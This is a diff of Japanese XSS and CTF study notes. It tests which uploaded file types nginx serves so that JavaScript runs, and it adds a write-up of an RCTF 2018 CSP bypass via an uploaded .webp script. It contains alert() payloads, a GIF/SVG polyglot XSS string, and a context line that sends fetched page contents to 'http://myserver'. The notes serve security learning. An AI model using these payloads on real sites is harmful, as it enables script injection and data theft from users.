@@ -201,6 +201,7 @@ http://cocu.hatenablog.com/entry/2013/12/23/033137
   
 SVG画像以外をXSSに使用する場合は、`.webp`,`jpg`などがあるっぽい？  
 基本的にこれらの画像ファイルをアップロードして、そのURLにアクセスすると`Content-Type: image/png`などのContent typeがサーバーに返され、ブラウザがこれをHTMLとしてではなく画像ファイルとして認識してHTMLで解釈せず画像ファイルとして開こうとするため、画像ファイルの中にJavaScriptを挿入していても実行は(基本的に)できない。  
+ただしSVGは`image/svg+xml`を返すがアクセスすることでJavascriptを実行できる。  
   
 ただサーバー側の設定で、中身がJavaScriptの`alert.png`ファイルを、中身だけからContent typeを`application/javascript`として認識して返す場合には、ブラウザにはJavaScriptとして渡されるためJavaScriptを実行できる。  
   
@@ -210,7 +211,48 @@ SVG画像以外をXSSに使用する場合は、`.webp`,`jpg`などがあるっ�
   
 JavaScriptが埋め込まれたjpgファイルはここにある。  
 https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs  
-
+  
+  
+以下、普通のnginxでのContent typeの挙動を確認した。  
+`evil.html`にURLから直接アクセスすると`Content-Type: text/html`が返りJavaScriptを実行できる。  
+html内から`<iframe src=/evil.html>`で読み込むとJavaScriptを実行できる。`<script src=/evil.html></script>`で読み込むとJavascriptは実行できない。  
+```html
+<script>
+alert(document.domain);
+</script>
+```
+`alret.js`にURLから直接アクセスすると`Content-Type: application/javascript`が返りJavaScriptを実行できない。  
+html内から`<script src=/alert.js></script>`で読み込むとJavaScriptを実行できる。  
+```html
+alert(1);
+```
+`evil`にURLから直接アクセスするとなぜかBase64エンコードされていて、`Content-Type: application/octet-stream`が返りJavaScriptを実行できない。  
+html内から`<script src=/evil></script>`で読み込むとなぜかBase64エンコードされていてJavaScriptを実行できない。  
+```html
+   <script>
+      alert("evil");
+   </script>
+```
+`evil.png`にURLから直接アクセスすると`Content-Type: image/png`が返りJavaScriptを実行できない。  
+html内から`<script src=/evil.png></script>`で読み込むとJavaScriptを実行できない。  
+```html
+<script>alert(1)</script>
+```
+`evil.gif`にURLから直接アクセスすると`Content-Type: image/gif`が返りJavaScriptを実行できない。  
+html内から`<script src=/evil.gif></script>`,`<iframe src=/evil.gif>`,`<img src=/evil.gif>`で読み込むとJavaScriptを実行できない。  
+https://brutelogic.com.br/blog/file-upload-xss/  
+ここでは以下の2つ目で実行できてるっぽいけど多分その場合はContent typeが`image/gif`になってないのでは？？？  
+```html
+<script>alert(1)</script>
+```
+```txt
+GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
+```
+`evil.txt`にURLから直接アクセスすると`Content-Type: text/plain`が返りJavaScriptを実行できない。  
+html内から`<script src=/evil.txt></script>`,`<iframe src=/evil.txt>`,`<img src=/evil.txt>`で読み込むとJavaScriptを実行できない。  
+```html
+<script>alert(1)</script>
+```
 # writeup
 ## Reflect / JSON Injection (CONFidence 2020 Teaser)
 https://www.gem-love.com/ctf/2019.html   
@@ -1345,11 +1387,20 @@ xmlhttp.send();
 r=xmlhttp.responseText;
 location.href='http://myserver/?q='+btoa(r);
 ```
-## 
+## .webp file upload / CSP script-src 'nonce-d5e8e7861922fbe3f9284a68ce2d7d60' bypass (RCTF 2018 - rBlog 2018)
+https://graneed.hatenablog.com/entry/2018/05/21/121851  
 - **entrypoint**   
-- **概要**   
+TitleとContentの入力、Effect(投稿記事の後ろに付くエフェクト)の選択、画像のアップロードをしてBlog記事を投稿するサイト。  
+CSPは以下のようになっており厳しい。  
+```txt
+Content-Security-Policy: default-src 'none'; script-src 'nonce-d5e8e7861922fbe3f9284a68ce2d7d60'; frame-src https://www.google.com/recaptcha/; style-src 'self' 'unsafe-inline' fonts.googleapis.com; font-src fonts.gstatic.com; img-src 'self'
+```
+titleタグでサニタイジングされてなくて`<script>`タグを自由に挿入できるらしい。また、Effectの値が`<script nonce="2214830e1c9cc417fd37babcf83c81c0" src="/assets/js/effects/styleの値.min.js"></script>`みたいにセットされるらしい。  
+jpg、bmp、gif、pngをアップロードしたときは、そのアップロード先のURLにアクセスしたときの応答ヘッダーに`Content-Type: image/`となっておりJavascriptを実行できないのでこれらは使えない。  
+`.webp`ならContent typeが設定されないらしい。  
+なので`.webp`ファイルの中にJavascriptを仕込んで、`<script nonce="470532bcd9e5bd79c9138a88cad3e6d4" src="/assets/js/effects/../../../upload/images/4daccad65173686b0d0311fabeff9141.webp".min.js"></script>`で読み込んで実行させる。  
 - **Payload**   
-
+ブログ内で`.webp`ファイルの作成方法が書かれている。  
 ## 
 - **entrypoint**   
 - **概要**   
